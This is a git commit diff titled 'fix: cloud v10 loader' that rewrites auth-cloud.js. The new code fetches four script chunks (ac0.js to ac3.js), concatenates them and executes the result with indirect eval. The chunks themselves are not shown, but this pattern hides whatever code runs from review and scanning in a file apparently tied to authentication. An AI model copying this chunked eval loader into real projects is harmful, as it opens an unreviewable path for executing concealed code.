3d6bbc522782908b8a769b173d0fe86e285d1f95
clubvine44-gif <clubvine44@gmail.com>
2026-08-20 03:26:19 +0300

    fix: cloud v10 loader (smart merge)

--- auth-cloud.js
+++ auth-cloud.js
@@ -1,1 +1,5 @@
-PLACEHOLDER_WILL_FAIL
+(async function(){
+  const n=4;
+  const parts=await Promise.all(Array.from({length:n},(_,i)=>fetch('ac'+i+'.js?v=10',{cache:'no-store'}).then(r=>r.text())));
+  (0,eval)(parts.join(''));
+})();
